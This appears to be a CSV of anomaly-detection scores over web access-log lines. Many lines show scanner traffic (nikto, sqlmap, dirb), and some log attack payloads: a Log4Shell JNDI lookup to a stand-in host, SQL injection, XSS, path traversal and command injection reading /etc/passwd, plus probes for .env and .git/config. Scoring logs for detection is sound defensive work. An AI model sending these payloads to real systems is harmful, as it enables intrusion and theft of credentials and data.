score_content,score_session,score_fused,score_fused_norm,line
0.3265187442302704,,0.3265187442302704,0.3265187442302704,199.146.174.32 - - [10/Jan/2025:12:12:24 +0000] "GET /index.html HTTP/1.1" 200 5299 "https://twitter.com/" "curl/7.85.0"
30126.66796875,,30126.66796875,30126.66796875,104.15.53.212 - - [10/Jan/2025:12:12:26 +0000] "GET /login HTTP/1.1" 404 426 "https://example.com/" "python-requests/2.31.0"
7.561233997344971,,7.561233997344971,7.561233997344971,30.8.125.157 - - [10/Jan/2025:12:12:28 +0000] "POST /server-status HTTP/1.1" 302 15125 "https://news.ycombinator.com/" "curl/7.85.0"
35.80509567260742,,35.80509567260742,35.80509567260742,124.87.28.134 - - [10/Jan/2025:12:12:29 +0000] "PUT /search?q=phone HTTP/1.1" 201 2790 "https://www.google.com/" "curl/7.85.0"
27.161531448364258,,27.161531448364258,27.161531448364258,121.217.144.181 - - [10/Jan/2025:12:12:29 +0000] "GET /search?q=headphones HTTP/1.1" 301 5702 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
70.0865249633789,,70.0865249633789,70.0865249633789,80.119.55.2 - - [10/Jan/2025:12:12:31 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 19723 "https://twitter.com/" "nikto/2.5.0"
30194.2578125,,30194.2578125,30194.2578125,111.23.188.193 - - [10/Jan/2025:12:12:34 +0000] "HEAD /search?q=router HTTP/1.1" 400 1167 "-" "curl/7.85.0"
127.14006805419922,,127.14006805419922,127.14006805419922,240.12.212.146 - - [10/Jan/2025:12:12:34 +0000] "TRACE /search?q=laptop HTTP/1.1" 200 5296 "https://www.google.com/" "nikto/2.5.0"
30194.26171875,,30194.26171875,30194.26171875,96.145.15.69 - - [10/Jan/2025:12:12:37 +0000] "HEAD /search?q=router HTTP/1.1" 400 987 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30220.1796875,,30220.1796875,30220.1796875,250.150.52.5 - - [10/Jan/2025:12:12:40 +0000] "OPTIONS /search?q=phone HTTP/1.1" 404 271 "https://news.ycombinator.com/" "nikto/2.5.0"
104.67157745361328,,104.67157745361328,104.67157745361328,50.249.65.118 - - [10/Jan/2025:12:12:41 +0000] "TRACE /api/products HTTP/1.1" 200 7271 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
13.513108253479004,,13.513108253479004,13.513108253479004,88.51.108.185 - - [10/Jan/2025:12:12:43 +0000] "PUT /about HTTP/1.1" 200 139 "https://news.ycombinator.com/" "dirb/2.22"
49.96676254272461,,49.96676254272461,49.96676254272461,88.126.246.95 - - [10/Jan/2025:12:12:43 +0000] "DELETE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 11963 "https://news.ycombinator.com/" "dirb/2.22"
73.4602279663086,,73.4602279663086,73.4602279663086,223.147.53.137 - - [10/Jan/2025:12:12:46 +0000] "OPTIONS /admin HTTP/1.1" 200 19351 "https://news.ycombinator.com/" "python-requests/2.31.0"
11087.205078125,,11087.205078125,11087.205078125,184.96.50.2 - - [10/Jan/2025:12:12:48 +0000] "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 500 934 "-" "nikto/2.5.0"
4.9262003898620605,,4.9262003898620605,4.9262003898620605,31.104.246.157 - - [10/Jan/2025:12:12:48 +0000] "POST /login HTTP/1.1" 200 10912 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
72.98971557617188,,72.98971557617188,72.98971557617188,100.194.113.234 - - [10/Jan/2025:12:12:49 +0000] "HEAD /search?q=phone HTTP/1.1" 304 5717 "https://twitter.com/" "nikto/2.5.0"
13.243841171264648,,13.243841171264648,13.243841171264648,173.12.123.136 - - [10/Jan/2025:12:12:50 +0000] "PUT /server-status HTTP/1.1" 204 17173 "-" "dirb/2.22"
27.624095916748047,,27.624095916748047,27.624095916748047,104.174.18.169 - - [10/Jan/2025:12:12:52 +0000] "DELETE /dashboard HTTP/1.1" 200 12961 "https://twitter.com/" "sqlmap/1.7.2#stable"
70.01566314697266,,70.01566314697266,70.01566314697266,196.76.241.39 - - [10/Jan/2025:12:12:54 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 859 "https://twitter.com/" "curl/7.85.0"
30174.392578125,,30174.392578125,30174.392578125,34.56.206.193 - - [10/Jan/2025:12:12:57 +0000] "DELETE /search?q=router HTTP/1.1" 403 1123 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
11064.42578125,,11064.42578125,11064.42578125,184.217.87.174 - - [10/Jan/2025:12:12:57 +0000] "POST /search?q=headphones HTTP/1.1" 503 760 "https://example.com/" "dirb/2.22"
76.25899505615234,,76.25899505615234,76.25899505615234,204.83.243.95 - - [10/Jan/2025:12:13:00 +0000] "OPTIONS /about HTTP/1.1" 302 1649 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
4.916460037231445,,4.916460037231445,4.916460037231445,199.39.63.175 - - [10/Jan/2025:12:13:03 +0000] "GET /profile HTTP/1.1" 304 10489 "https://www.google.com/" "python-requests/2.31.0"
13.502742767333984,,13.502742767333984,13.502742767333984,210.61.12.167 - - [10/Jan/2025:12:13:05 +0000] "PUT /login HTTP/1.1" 200 14942 "https://www.google.com/" "dirb/2.22"
104.85419464111328,,104.85419464111328,104.85419464111328,212.98.26.187 - - [10/Jan/2025:12:13:08 +0000] "TRACE /login HTTP/1.1" 200 17634 "-" "python-requests/2.31.0"
30124.7109375,,30124.7109375,30124.7109375,218.97.157.109 - - [10/Jan/2025:12:13:11 +0000] "GET /assets/app.js HTTP/1.1" 400 1336 "https://twitter.com/" "sqlmap/1.7.2#stable"
2.2747533321380615,,2.2747533321380615,2.2747533321380615,246.150.102.138 - - [10/Jan/2025:12:13:11 +0000] "GET / HTTP/1.1" 200 7008 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
3.0626001358032227,,3.0626001358032227,3.0626001358032227,117.90.77.36 - - [10/Jan/2025:12:13:11 +0000] "POST /../../etc/passwd HTTP/1.1" 200 14578 "https://example.com/" "python-requests/2.31.0"
127.16122436523438,,127.16122436523438,127.16122436523438,117.22.37.214 - - [10/Jan/2025:12:13:11 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 3276 "https://news.ycombinator.com/" "curl/7.85.0"
95.78459167480469,,95.78459167480469,95.78459167480469,84.177.214.31 - - [10/Jan/2025:12:13:11 +0000] "OPTIONS /search?q=router HTTP/1.1" 200 15386 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
95.96503448486328,,95.96503448486328,95.96503448486328,187.8.179.44 - - [10/Jan/2025:12:13:14 +0000] "OPTIONS /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 16029 "https://www.google.com/" "sqlmap/1.7.2#stable"
104.81015014648438,,104.81015014648438,104.81015014648438,30.124.200.188 - - [10/Jan/2025:12:13:15 +0000] "TRACE /logout HTTP/1.1" 200 15900 "-" "curl/7.85.0"
127.12871551513672,,127.12871551513672,127.12871551513672,155.153.168.169 - - [10/Jan/2025:12:13:17 +0000] "TRACE /search?q=monitor HTTP/1.1" 200 7274 "https://www.google.com/" "curl/7.85.0"
73.33572387695312,,73.33572387695312,73.33572387695312,136.148.5.252 - - [10/Jan/2025:12:13:18 +0000] "OPTIONS /profile HTTP/1.1" 200 6533 "https://twitter.com/" "curl/7.85.0"
11050.7021484375,,11050.7021484375,11050.7021484375,35.89.157.33 - - [10/Jan/2025:12:13:21 +0000] "PUT /login HTTP/1.1" 503 1208 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
0.26951950788497925,,0.26951950788497925,0.26951950788497925,126.23.38.73 - - [10/Jan/2025:12:13:24 +0000] "GET /assets/app.css HTTP/1.1" 200 18390 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
13.304787635803223,,13.304787635803223,13.304787635803223,231.40.13.234 - - [10/Jan/2025:12:13:25 +0000] "PUT /api/products HTTP/1.1" 200 2467 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
104.75418090820312,,104.75418090820312,104.75418090820312,219.65.167.39 - - [10/Jan/2025:12:13:25 +0000] "TRACE /profile HTTP/1.1" 200 10740 "https://twitter.com/" "nikto/2.5.0"
16.221790313720703,,16.221790313720703,16.221790313720703,64.242.207.46 - - [10/Jan/2025:12:13:27 +0000] "PUT /api/products HTTP/1.1" 304 2401 "https://example.com/" "dirb/2.22"
0.2736653983592987,,0.2736653983592987,0.2736653983592987,41.108.94.74 - - [10/Jan/2025:12:13:28 +0000] "GET /assets/app.css HTTP/1.1" 200 19765 "https://news.ycombinator.com/" "nikto/2.5.0"
24.384376525878906,,24.384376525878906,24.384376525878906,67.76.119.136 - - [10/Jan/2025:12:13:30 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 201 19102 "https://www.google.com/" "dirb/2.22"
95.70260620117188,,95.70260620117188,95.70260620117188,246.111.183.40 - - [10/Jan/2025:12:13:31 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 1346 "https://news.ycombinator.com/" "dirb/2.22"
127.1467514038086,,127.1467514038086,127.1467514038086,194.71.246.35 - - [10/Jan/2025:12:13:33 +0000] "TRACE /search?q=monitor HTTP/1.1" 200 11313 "https://example.com/" "python-requests/2.31.0"
38.773868560791016,,38.773868560791016,38.773868560791016,224.158.207.126 - - [10/Jan/2025:12:13:34 +0000] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 304 11809 "-" "dirb/2.22"
76.19140625,,76.19140625,76.19140625,213.63.221.92 - - [10/Jan/2025:12:13:34 +0000] "OPTIONS /contact HTTP/1.1" 302 3534 "https://twitter.com/" "nikto/2.5.0"
0.3474214971065521,,0.3474214971065521,0.3474214971065521,156.64.108.134 - - [10/Jan/2025:12:13:35 +0000] "GET /index.html HTTP/1.1" 200 9666 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
47.710758209228516,,47.710758209228516,47.710758209228516,153.105.202.144 - - [10/Jan/2025:12:13:35 +0000] "HEAD /about HTTP/1.1" 201 4966 "https://news.ycombinator.com/" "dirb/2.22"
30129.39453125,,30129.39453125,30129.39453125,195.1.43.225 - - [10/Jan/2025:12:13:38 +0000] "POST /about HTTP/1.1" 401 980 "https://www.google.com/" "dirb/2.22"
2.291951894760132,,2.291951894760132,2.291951894760132,6.57.235.188 - - [10/Jan/2025:12:13:39 +0000] "GET / HTTP/1.1" 200 10843 "https://example.com/" "sqlmap/1.7.2#stable"
0.26702558994293213,,0.26702558994293213,0.26702558994293213,65.23.187.65 - - [10/Jan/2025:12:13:41 +0000] "GET /assets/app.css HTTP/1.1" 200 17591 "https://twitter.com/" "dirb/2.22"
73.45670318603516,,73.45670318603516,73.45670318603516,35.31.12.229 - - [10/Jan/2025:12:13:41 +0000] "OPTIONS /about HTTP/1.1" 200 18200 "https://www.google.com/" "curl/7.85.0"
73.41500091552734,,73.41500091552734,73.41500091552734,17.99.175.63 - - [10/Jan/2025:12:13:41 +0000] "OPTIONS /about HTTP/1.1" 200 7387 "https://example.com/" "sqlmap/1.7.2#stable"
73.39961242675781,,73.39961242675781,73.39961242675781,206.207.215.64 - - [10/Jan/2025:12:13:44 +0000] "OPTIONS /logout HTTP/1.1" 200 12746 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
70.05702209472656,,70.05702209472656,70.05702209472656,200.204.174.42 - - [10/Jan/2025:12:13:46 +0000] "HEAD /search?q=phone HTTP/1.1" 200 2002 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
4.744570732116699,,4.744570732116699,4.744570732116699,63.33.132.80 - - [10/Jan/2025:12:13:46 +0000] "GET /phpmyadmin HTTP/1.1" 301 7717 "https://news.ycombinator.com/" "curl/7.85.0"
95.79663848876953,,95.79663848876953,95.79663848876953,105.16.215.34 - - [10/Jan/2025:12:13:46 +0000] "OPTIONS /search?q=phone HTTP/1.1" 200 12337 "https://example.com/" "sqlmap/1.7.2#stable"
35.879154205322266,,35.879154205322266,35.879154205322266,196.127.229.203 - - [10/Jan/2025:12:13:49 +0000] "PUT /search?q=ssd HTTP/1.1" 200 6720 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.7798069715499878,,1.7798069715499878,1.7798069715499878,230.23.120.165 - - [10/Jan/2025:12:13:52 +0000] "GET /server-status HTTP/1.1" 204 4687 "https://twitter.com/" "sqlmap/1.7.2#stable"
4.8455281257629395,,4.8455281257629395,4.8455281257629395,244.150.52.122 - - [10/Jan/2025:12:13:53 +0000] "POST /profile HTTP/1.1" 200 9558 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2699262201786041,,0.2699262201786041,0.2699262201786041,246.81.124.113 - - [10/Jan/2025:12:13:53 +0000] "GET /assets/app.js HTTP/1.1" 200 11397 "https://example.com/" "dirb/2.22"
27.149578094482422,,27.149578094482422,27.149578094482422,163.173.41.148 - - [10/Jan/2025:12:13:56 +0000] "POST /search?q=headphones HTTP/1.1" 200 3508 "-" "nikto/2.5.0"
3.083850622177124,,3.083850622177124,3.083850622177124,40.162.205.135 - - [10/Jan/2025:12:13:59 +0000] "GET /assets/app.js HTTP/1.1" 301 1824 "https://www.google.com/" "dirb/2.22"
73.3223876953125,,73.3223876953125,73.3223876953125,56.87.121.234 - - [10/Jan/2025:12:13:59 +0000] "OPTIONS /contact HTTP/1.1" 200 4006 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.740123748779297,,27.740123748779297,27.740123748779297,182.152.69.211 - - [10/Jan/2025:12:14:01 +0000] "DELETE /about HTTP/1.1" 200 6659 "https://twitter.com/" "nikto/2.5.0"
70.03412628173828,,70.03412628173828,70.03412628173828,234.132.86.62 - - [10/Jan/2025:12:14:02 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 2101 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
69.954833984375,,69.954833984375,69.954833984375,114.73.64.70 - - [10/Jan/2025:12:14:04 +0000] "HEAD /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 13652 "-" "dirb/2.22"
27.64411163330078,,27.64411163330078,27.64411163330078,57.69.139.22 - - [10/Jan/2025:12:14:06 +0000] "DELETE /dashboard HTTP/1.1" 200 18886 "https://example.com/" "python-requests/2.31.0"
27.30805015563965,,27.30805015563965,27.30805015563965,58.35.41.199 - - [10/Jan/2025:12:14:09 +0000] "POST /search?q=phone HTTP/1.1" 200 17427 "https://twitter.com/" "nikto/2.5.0"
11.94118595123291,,11.94118595123291,11.94118595123291,165.233.226.225 - - [10/Jan/2025:12:14:09 +0000] "PUT /.env HTTP/1.1" 200 3040 "https://twitter.com/" "python-requests/2.31.0"
46.23344039916992,,46.23344039916992,46.23344039916992,158.159.191.104 - - [10/Jan/2025:12:14:09 +0000] "HEAD /.env HTTP/1.1" 200 11940 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
47.73330307006836,,47.73330307006836,47.73330307006836,25.29.234.204 - - [10/Jan/2025:12:14:09 +0000] "HEAD /login HTTP/1.1" 201 9602 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.366758346557617,,24.366758346557617,24.366758346557617,175.228.71.179 - - [10/Jan/2025:12:14:09 +0000] "GET /search?q=monitor HTTP/1.1" 200 6527 "https://news.ycombinator.com/" "python-requests/2.31.0"
13.475839614868164,,13.475839614868164,13.475839614868164,195.81.145.199 - - [10/Jan/2025:12:14:10 +0000] "PUT /logout HTTP/1.1" 200 18439 "https://www.google.com/" "python-requests/2.31.0"
130.0597686767578,,130.0597686767578,130.0597686767578,175.91.116.168 - - [10/Jan/2025:12:14:12 +0000] "TRACE /search?q=router HTTP/1.1" 304 6493 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
70.0854263305664,,70.0854263305664,70.0854263305664,235.143.162.178 - - [10/Jan/2025:12:14:12 +0000] "HEAD /search?q=camera HTTP/1.1" 200 12994 "https://example.com/" "curl/7.85.0"
24.39872932434082,,24.39872932434082,24.39872932434082,142.183.78.44 - - [10/Jan/2025:12:14:14 +0000] "GET /search?q=camera HTTP/1.1" 200 8725 "-" "Wget/1.21.2 (linux-gnu)"
2.2567532062530518,,2.2567532062530518,2.2567532062530518,125.182.6.238 - - [10/Jan/2025:12:14:15 +0000] "GET / HTTP/1.1" 200 3547 "https://www.google.com/" "sqlmap/1.7.2#stable"
13.420551300048828,,13.420551300048828,13.420551300048828,102.242.94.55 - - [10/Jan/2025:12:14:18 +0000] "PUT /contact HTTP/1.1" 200 12955 "https://twitter.com/" "dirb/2.22"
0.3817162811756134,,0.3817162811756134,0.3817162811756134,175.16.64.132 - - [10/Jan/2025:12:14:20 +0000] "GET /index.html HTTP/1.1" 200 19265 "-" "dirb/2.22"
50.198829650878906,,50.198829650878906,50.198829650878906,5.216.105.175 - - [10/Jan/2025:12:14:21 +0000] "DELETE /search?q=ssd HTTP/1.1" 201 19684 "-" "Wget/1.21.2 (linux-gnu)"
30160.126953125,,30160.126953125,30160.126953125,31.247.93.129 - - [10/Jan/2025:12:14:23 +0000] "PUT /search?q=router HTTP/1.1" 403 545 "https://twitter.com/" "curl/7.85.0"
98.67646026611328,,98.67646026611328,98.67646026611328,51.126.140.213 - - [10/Jan/2025:12:14:23 +0000] "OPTIONS /api/user?id=1;DROP TABLE users HTTP/1.1" 301 17272 "https://www.google.com/" "curl/7.85.0"
2.100069284439087,,2.100069284439087,2.100069284439087,244.181.222.54 - - [10/Jan/2025:12:14:25 +0000] "GET /login HTTP/1.1" 200 17827 "https://twitter.com/" "dirb/2.22"
30125.037109375,,30125.037109375,30125.037109375,155.14.133.119 - - [10/Jan/2025:12:14:25 +0000] "GET /index.html HTTP/1.1" 404 107 "https://www.google.com/" "curl/7.85.0"
2.042604684829712,,2.042604684829712,2.042604684829712,134.141.139.120 - - [10/Jan/2025:12:14:26 +0000] "GET /about HTTP/1.1" 200 4058 "https://www.google.com/" "curl/7.85.0"
11087.23046875,,11087.23046875,11087.23046875,114.91.215.115 - - [10/Jan/2025:12:14:28 +0000] "DELETE /search?q=headphones HTTP/1.1" 503 921 "https://www.google.com/" "python-requests/2.31.0"
26.028234481811523,,26.028234481811523,26.028234481811523,182.91.81.19 - - [10/Jan/2025:12:14:30 +0000] "DELETE /.git/config HTTP/1.1" 200 17380 "https://twitter.com/" "sqlmap/1.7.2#stable"
73.263916015625,,73.263916015625,73.263916015625,105.22.27.220 - - [10/Jan/2025:12:14:30 +0000] "OPTIONS /api/products HTTP/1.1" 200 446 "https://example.com/" "dirb/2.22"
16.152265548706055,,16.152265548706055,16.152265548706055,25.220.247.184 - - [10/Jan/2025:12:14:32 +0000] "PUT /phpmyadmin HTTP/1.1" 302 3167 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.802628755569458,,1.802628755569458,1.802628755569458,75.212.104.2 - - [10/Jan/2025:12:14:32 +0000] "GET /server-status HTTP/1.1" 200 7885 "-" "dirb/2.22"
30124.794921875,,30124.794921875,30124.794921875,109.168.123.136 - - [10/Jan/2025:12:14:32 +0000] "GET /index.html HTTP/1.1" 400 1372 "-" "nikto/2.5.0"
11039.525390625,,11039.525390625,11039.525390625,156.48.234.231 - - [10/Jan/2025:12:14:33 +0000] "GET / HTTP/1.1" 503 1033 "-" "nikto/2.5.0"
24.453798294067383,,24.453798294067383,24.453798294067383,13.228.173.82 - - [10/Jan/2025:12:14:34 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 2528 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.3161494731903076,,2.3161494731903076,2.3161494731903076,154.15.88.73 - - [10/Jan/2025:12:14:36 +0000] "GET / HTTP/1.1" 200 17579 "https://www.google.com/" "nikto/2.5.0"
104.64530944824219,,104.64530944824219,104.64530944824219,68.120.186.165 - - [10/Jan/2025:12:14:38 +0000] "TRACE /dashboard HTTP/1.1" 200 2415 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
0.3205953538417816,,0.3205953538417816,0.3205953538417816,9.93.48.130 - - [10/Jan/2025:12:14:40 +0000] "GET /index.html HTTP/1.1" 200 4184 "https://news.ycombinator.com/" "nikto/2.5.0"
105.89244842529297,,105.89244842529297,105.89244842529297,47.232.69.44 - - [10/Jan/2025:12:14:41 +0000] "TRACE /wp-login.php HTTP/1.1" 302 5818 "https://twitter.com/" "nikto/2.5.0"
47.4684944152832,,47.4684944152832,47.4684944152832,22.113.171.92 - - [10/Jan/2025:12:14:42 +0000] "HEAD /server-status HTTP/1.1" 200 8044 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.28909024596214294,,0.28909024596214294,0.28909024596214294,16.76.157.81 - - [10/Jan/2025:12:14:45 +0000] "GET /assets/app.js HTTP/1.1" 200 16720 "https://www.google.com/" "curl/7.85.0"
50.1305046081543,,50.1305046081543,50.1305046081543,187.132.163.187 - - [10/Jan/2025:12:14:47 +0000] "DELETE /api/product?id=123 HTTP/1.1" 204 13387 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
50.29751968383789,,50.29751968383789,50.29751968383789,227.163.234.86 - - [10/Jan/2025:12:14:49 +0000] "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 17376 "https://news.ycombinator.com/" "python-requests/2.31.0"
95.69330596923828,,95.69330596923828,95.69330596923828,218.175.64.211 - - [10/Jan/2025:12:14:52 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 11295 "https://news.ycombinator.com/" "curl/7.85.0"
0.29073354601860046,,0.29073354601860046,0.29073354601860046,241.137.254.135 - - [10/Jan/2025:12:14:53 +0000] "GET /assets/app.js HTTP/1.1" 200 17229 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
70.10452270507812,,70.10452270507812,70.10452270507812,53.97.131.188 - - [10/Jan/2025:12:14:54 +0000] "HEAD /search?q=phone HTTP/1.1" 200 11936 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
35.82780075073242,,35.82780075073242,35.82780075073242,161.14.93.250 - - [10/Jan/2025:12:14:54 +0000] "PUT /search?q=router HTTP/1.1" 200 11968 "-" "Wget/1.21.2 (linux-gnu)"
127.06902313232422,,127.06902313232422,127.06902313232422,9.119.66.198 - - [10/Jan/2025:12:14:56 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 6234 "-" "nikto/2.5.0"
35.808048248291016,,35.808048248291016,35.808048248291016,128.161.29.102 - - [10/Jan/2025:12:14:57 +0000] "PUT /search?q=laptop HTTP/1.1" 200 7439 "https://twitter.com/" "nikto/2.5.0"
50.093360900878906,,50.093360900878906,50.093360900878906,225.97.103.145 - - [10/Jan/2025:12:14:58 +0000] "DELETE /search?q=laptop HTTP/1.1" 201 10871 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
